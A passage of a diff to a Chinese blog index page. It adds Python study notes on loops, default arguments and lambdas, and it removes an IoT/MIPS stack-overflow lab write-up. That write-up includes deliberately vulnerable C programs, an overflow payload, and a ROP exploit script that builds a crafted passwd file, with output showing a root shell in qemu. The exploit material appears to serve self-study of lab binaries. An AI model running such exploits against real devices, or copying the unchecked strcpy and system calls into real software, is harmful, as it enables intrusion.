+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-11T14:29:40+08:00">
+                2019-08-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/note/" itemprop="url" rel="index">
+                    <span itemprop="name">note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  794
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1>python 官方文档阅读</h1>
+<p>python可视化编程<a href="http://www.pythontutor.com/visualize.html#mode=edit" target="_blank" rel="noopener">网站</a></p>
+<h2>循环</h2>
+<h3>循环的问题</h3>
+<p>list类型是可变序列</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">'cat'</span>, <span class="string">'window'</span>, <span class="string">'defenestrate'</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words[:]:</span><br><span class="line">    <span class="keyword">if</span> len(w) &gt; <span class="number">6</span>:</span><br><span class="line">        words.insert(<span class="number">0</span>, w)</span><br><span class="line">print(words)</span><br></pre></td></tr></table></figure></p>
+<p>如果将上述代码的循环语句改为：
+<code>for w in words:</code>
+那么这个循环就变成了死循环
+原因是words这个<code>list</code>会被修改</p>
+<p>同样的可以看这个：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">basket = [<span class="string">'apple'</span>, <span class="string">'orange'</span>, <span class="string">'pear'</span>, <span class="string">'orange'</span>, <span class="string">'banana'</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> sorted(basket):</span><br><span class="line">    print(f)</span><br><span class="line"></span><br><span class="line">print(basket)</span><br></pre></td></tr></table></figure></p>
+<p>在经过<code>sorted</code>函数之后，basket已经被修改了</p>
+<p>可以看这个：</p>
+<p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p>
+<p>同样的list还有这样一个问题：</p>
+<p>代码如下：
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L=[])</span>:</span></span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line">print(f(<span class="number">1</span>))</span><br><span class="line">print(f(<span class="number">2</span>))</span><br><span class="line">print(f(<span class="number">3</span>))</span><br></pre></td></tr></table></figure></p>
+<p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p>
+<p>修改成这样就行：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L = None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure></p>
+<h3>循环的tricks</h3>
+<p>dict循环</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">knights = &#123;<span class="string">'gallahad'</span>:<span class="string">'the pure'</span>, <span class="string">'robin'</span>:<span class="string">'the brave'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> knights.items():</span><br><span class="line">    print(key, value)</span><br></pre></td></tr></table></figure></p>
+<p>list循环</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate([<span class="string">'tac'</span>, <span class="string">'tic'</span>, <span class="string">'toe'</span>]):</span><br><span class="line">    print(<span class="string">"index = &#123;&#125;, value = &#123;&#125;"</span>.format(index, value))</span><br></pre></td></tr></table></figure></p>
+<p>两个list循环</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">questions = [<span class="string">'name'</span>, <span class="string">'quest'</span>, <span class="string">'favorite color'</span>]</span><br><span class="line">answers = [<span class="string">'lancelot'</span>, <span class="string">'the holy grail'</span>, <span class="string">'blue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q,a <span class="keyword">in</span> zip(questions, answers):</span><br><span class="line">    print(<span class="string">"what is your &#123;&#125;? It is &#123;&#125;"</span>.format(q, a))</span><br></pre></td></tr></table></figure></p>
+<p>逆向循环</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逆向循环序列时，先正向，再调用reverse()函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">2</span>)):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></p>
+<p>指定顺序循环，用<code>sorted</code>函数</p>
+<h3>参数的传递</h3>
+<p>之前还一直没明白python中<code>**param</code>这种传递形式的用法
+这个栗子就很棒啦</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheeseshop</span><span class="params">(kind, *arguments, **keywords)</span>:</span></span><br><span class="line">    print(<span class="string">"-- Do you have any"</span>, kind, <span class="string">"?"</span>)</span><br><span class="line">    print(<span class="string">"-- I'm sorry, we're all out of"</span>, kind)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> arguments:</span><br><span class="line">        print(arg)</span><br><span class="line">    print(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> keywords:</span><br><span class="line">        print(kw, <span class="string">":"</span>, keywords[kw])</span><br><span class="line">cheeseshop(<span class="string">"Limburger"</span>, <span class="string">"It's very runny, sir."</span>,</span><br><span class="line">           <span class="string">"It's really very, VERY runny, sir."</span>,shopkeeper=<span class="string">"Michael Palin"</span>,</span><br><span class="line">           client=<span class="string">"John Cleese"</span>,</span><br><span class="line">           sketch=<span class="string">"Cheese Shop Sketch"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>结果如下：</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- Do you have any Limburger ?</span><br><span class="line">-- I&apos;m sorry, we&apos;re all out of Limburger</span><br><span class="line">It&apos;s very runny, sir.</span><br><span class="line">It&apos;s really very, VERY runny, sir.</span><br><span class="line">----------------------------------------</span><br><span class="line">shopkeeper : Michael Palin</span><br><span class="line">sketch : Cheese Shop Sketch</span><br><span class="line">client : John Cleese</span><br></pre></td></tr></table></figure></p>
+<p>第一个kind参数就是第一个字符串，之后<code>arguments</code>相当于一个接收了一个list，keywords接收了一个dict</p>
+<h4>解包参数列表</h4>
+<p>比如这个栗子：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args = [<span class="number">3</span>,<span class="number">6</span>]</span><br><span class="line">list(range(*args))</span><br></pre></td></tr></table></figure></p>
+<p>输出的结果就是
+[3,4,5]</p>
+<p>也就是说我们可以通过<code>*</code>运算符来对一个list进行解包并将其作为参数传递</p>
+<h4>匿名函数lambda</h4>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pairs = [(<span class="number">1</span>, <span class="string">'one'</span>), (<span class="number">2</span>, <span class="string">'two'</span>), (<span class="number">3</span>, <span class="string">'three'</span>), (<span class="number">4</span>, <span class="string">'four'</span>)]</span><br><span class="line">pairs.sort(key=<span class="keyword">lambda</span>  pair:pair[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></p>
+<p>sort方法有两个参数，一个是指定待排序的关键字，一个是reversed，其中key用一个匿名函数进行指定，有一点函数式编程的味道</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/22/探寻数据库/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2247,552 +2737,6 @@ vsnprintf函数的用法：</p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/20/IOT-栈溢出笔记/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/20/IOT-栈溢出笔记/" itemprop="url">IOT 栈溢出笔记</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-20T09:04:36+08:00">
-                2019-07-20
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-22T13:26:18+08:00">
-                2019-07-22
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/IOT/" itemprop="url" rel="index">
-                    <span itemprop="name">IOT</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  2.2k
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  10
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1>MIPS栈溢出</h1>
-<h2>x86和MIPS指令集</h2>
-<p>在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm</p>
-<h3>MISP指令集存在栈溢出的原因</h3>
-<p>叶子函数和非叶子函数</p>
-<blockquote>
-<p>叶子函数的返回地址是直接放在 ra 寄存器中，而非叶子函数需要调用另外的函数，这里的差异就照成了非叶子函数需要把当前的返回地址暂时存放在栈上</p>
-</blockquote>
-<h2>实验环境</h2>
-<p>attifyOS虚拟机，基本内置了我需要的所有工具，当然其中的IDA似乎过期了，去吾爱破解上找了一个Linux版本的IDA安装了</p>
-<p><a href="https://www.52pojie.cn/thread-450156-1-1.html" target="_blank" rel="noopener">吾爱破解链接</a></p>
-<h2>MIPS动态调试</h2>
-<p>使用<code>qemu-mipsel</code>或者<code>qemu-mipsel-static</code>进行调试，qemu支持使用gdb进行调试，-g选项开启一个端口，IDA可以连接上这个端口从而进行动态调试。之前在看雪的虚拟机上只能用<code>qemu-mipsel-static</code>调试，后来换成了<code>attifyOS</code>发现两者都行。不过如果缺少动态链接库的话还是需要<code>chroot</code>同时将相应的库拷贝过来。</p>
-<h2>简单的栈溢出</h2>
-<p>源码：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void has_stack(char *src)&#123;</span><br><span class="line">        char dst[20] = &#123;0&#125;;</span><br><span class="line">        strcpy(dst,src);</span><br><span class="line">        printf(&quot;copy success!n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main(int argc,char *argv[])&#123;</span><br><span class="line">        has_stack(argv[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>使用<code>mipsel-linux-gcc</code>进行编译</p>
-<p><code>mipsel-linux-gcc ./stack01.c -o stack01 -static</code></p>
-<p>编译之后得到：
-<code>root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></p>
-<p>使用IDA查看反汇编：</p>
-<p>由于main函数中调用了其他的函数，所以main函数必然是非叶子函数，当然这里我们不是覆盖main函数的返回地址，因为<code>has_stack</code>函数也是非叶子函数，而且<code>strcpy</code>没有对长度做限制。</p>
-<p><code>strcpy</code>的第一个参数dst存放在<code>$a0</code>中，第二个参数src存放在<code>$a1</code>中，
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00400410                 sw      $zero, 0x38+var_10($fp)</span><br><span class="line">.text:00400414                 addiu   $v0, $fp, 0x38+var_20 #要拷贝到的地方</span><br><span class="line">.text:00400418                 move    $a0, $v0</span><br><span class="line">.text:0040041C                 lw      $a1, 0x38+arg_0($fp)  # 要拷贝的内容</span><br><span class="line">.text:00400420                 la      $v0, strcpy</span><br><span class="line">.text:00400424                 move    $t9, $v0</span><br><span class="line">.text:00400428                 jalr    $t9 ; strcpy</span><br><span class="line">.text:0040042C                 nop</span><br><span class="line">.text:00400430                 lw      $gp, 0x38+var_28($fp)</span><br></pre></td></tr></table></figure></p>
-<p>偷懒一点不仔细分析栈了</p>
-<p>使用<code>patternLocOffset.py</code>工具生成长度为30的字符串
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/home/oit [oit@ubuntu] [4:31]</span><br><span class="line">&gt; python patternOffset.py -c -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[+] output to patternShell.txt ok!</span><br><span class="line">[+] take time: 0.0004 s</span><br></pre></td></tr></table></figure></p>
-<p>动态调试：
-<code>./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9</code></p>
-<p>直接在调用函数返回的地方下断点，查看此时的<code>$ra</code>寄存器的值
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400450 move    $sp, $fp</span><br><span class="line">.text:00400454 lw      $ra, 0x38+var_4($sp)</span><br><span class="line">.text:00400458 lw      $fp, 0x38+var_8($sp)</span><br><span class="line">.text:0040045C addiu   $sp, 0x38</span><br><span class="line">.text:00400460 jr      $ra (断点)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/UsAmD68.png" alt="ra3"></p>
-<p>计算需要<code>padding</code>的长度
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; python patternOffset.py -s 0x62413961 -l 30</span><br><span class="line">[*] Create pattern string contains 30 characters ok!</span><br><span class="line">[*] No exact matches, looking for likely candidates...</span><br><span class="line">[+] Possible match at offset 28 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0008 s</span><br></pre></td></tr></table></figure></p>
-<p>需要填充28个字节</p>
-<p>最后的payload</p>
-<blockquote>
-<p>./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;`</p>
-</blockquote>
-<p>此时成功地发生了跳转
-<img src="https://i.imgur.com/nAokUL0.png" alt="vuln"></p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/stack# ./qemu-mipsel-static  ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# ls</span><br><span class="line">core	     qemu-mipsel-static  stack01    stack01.id0  stack01.idb  stack01.til</span><br><span class="line">qemu-mipsel  ret2txt.c		 stack01.c  stack01.id1  stack01.nam</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
-<h2>ROP chain</h2>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void do_system_0(int code,char *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[255];</span><br><span class="line">    //sleep(1);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[256]=&#123;0&#125;;</span><br><span class="line">    char ch;</span><br><span class="line">    int count = 0;</span><br><span class="line">    unsigned int fileLen = 0;</span><br><span class="line">    struct stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    if(0 == stat(&quot;passwd&quot;,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    else</span><br><span class="line">        return 1;</span><br><span class="line"></span><br><span class="line">    if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Cannot open file passwd!n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    while(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = &apos;x00&apos;;</span><br><span class="line"></span><br><span class="line">    if(!strcmp(buf,&quot;adminpwd&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system_0(count,&quot;ls -l&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;you have an invalid password!n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此处main函数明显是非叶子函数，我们要想办法调用<code>do_system_0</code>这个函数
-那就要想办法控制<code>$a1</code>寄存器，那样就可以执行任何命令</p>
-<p><code>mipsrop.stackfinder()</code>
-查找gadget
-<img src="https://i.imgur.com/FJpReqv.png" alt="mips_rop"></p>
-<p>我们选择
-<code>0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp)</code></p>
-<p>要做到跳转到我们的<code>gadget</code>，需要覆盖main函数的返回地址</p>
-<p>先计算要padding的长度</p>
-<p>此时计算出来的pattern是412，会不会太长了点(注：在我参考的文章中作者计算出来的偏移和我的不一样，刚开始我以为是自己计算错了，但是后来调试后认为自己并没有算错)
-<img src="https://i.imgur.com/0Q1gHli.png" alt="rop0"></p>
-<p>接下来我尝试先覆盖main函数的返回地址
-跳转到rop的空间，再将<code>/bin/sh</code>字符串的地址赋值给<code>$a1</code></p>
-<p><code>$ra</code>被覆盖
-<img src="https://i.imgur.com/28cvjLd.png" alt="rop1"></p>
-<p>f7单步一次，跳转到<code>gadget</code>
-而且此时栈空间已经布置好了
-<code>addiu $a1, $sp, 0x58+var_40</code>相当于 <code>$a1 = $sp+0x18</code></p>
-<p>此时<code>$sp+0x18</code>存放的就是<code>/bin/sh</code>字符串的地址
-<img src="https://i.imgur.com/EewHvzW.png" alt="rop3"></p>
-<p>然而不知道为什么
-这个错误就很不明不白了
-<img src="https://i.imgur.com/sUi3w2O.png" alt="rop4"></p>
-<p>重新回顾了一下《揭秘家用路由器0day漏洞挖掘技术》，看到了作者写的一个exp
-将gadget的地址替换成我的，如下：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">cmd = &quot;sh&quot;</span><br><span class="line"></span><br><span class="line">cmd += &quot;\x00&quot;*(4-len(cmd)%4)</span><br><span class="line"></span><br><span class="line">shellcode = &quot;A&quot;*0x19c</span><br><span class="line">shellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadget地址，作者写的是&quot;&lt;L&quot;但是我尝试之后发现地址是反的，所以换过来了</span><br><span class="line">shellcode+=&quot;A&quot;*24</span><br><span class="line">shellcode+=cmd</span><br><span class="line">shellcode+=&quot;B&quot;*(0x3C-len(cmd))</span><br><span class="line">shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0函数地址</span><br><span class="line">shellcode+=&quot;BBBB&quot;</span><br><span class="line"></span><br><span class="line">print &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">print &quot;[+] create password file&quot;</span><br><span class="line">fw = open(&apos;passwd&apos;, &apos;w&apos;)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.close()</span><br><span class="line">print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p>
-<p>生成<code>passwd</code>文件之后，<code>./qemu-mipsel-static -g 1234 ./vuln_system</code>进行调试
-当程序跳转到<code>gadget</code>时，变成了这样，
-<img src="https://i.imgur.com/ibeZvb8.png" alt="rop5"></p>
-<p>此时看终端：
-我居然成功了？？此时已经拿到了root权限
-<img src="https://i.imgur.com/m1S8DHs.png" alt="rop6"></p>
-<p>确实没有看错，重新运行一遍程序，确实拿到了shell权限
-<img src="https://i.imgur.com/VbXRlHO.png" alt="rop7"></p>
-<h1>DVRF 练习</h1>
-<p>这个在attifyOS上已经下载好了，当然也可以去GitHub上clone一份，一个很不错的项目</p>
-<p>来看Intro的<code>stack_bof_01</code>
-程序位于<code>/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/</code></p>
-<p>源码位于<code>/home/oit/DVRF/Pwnable Source/Intro</code>
